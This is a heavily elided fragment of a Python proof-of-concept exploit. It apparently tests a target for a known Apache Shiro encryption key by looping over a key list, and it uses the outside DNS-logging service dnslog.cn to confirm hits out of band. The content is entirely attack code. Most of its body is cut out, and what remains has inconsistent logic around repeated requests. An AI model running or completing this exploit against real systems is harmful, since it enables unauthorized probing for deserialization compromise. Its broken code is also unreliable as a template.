...
def poc(url):
    try:
        rep = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=5)
        ...
        for real_key in shiro_key:
            ...
            if 'dnslog' in rep1.text:
                ...
                rep1 = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=5)
                rep2 = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=5)
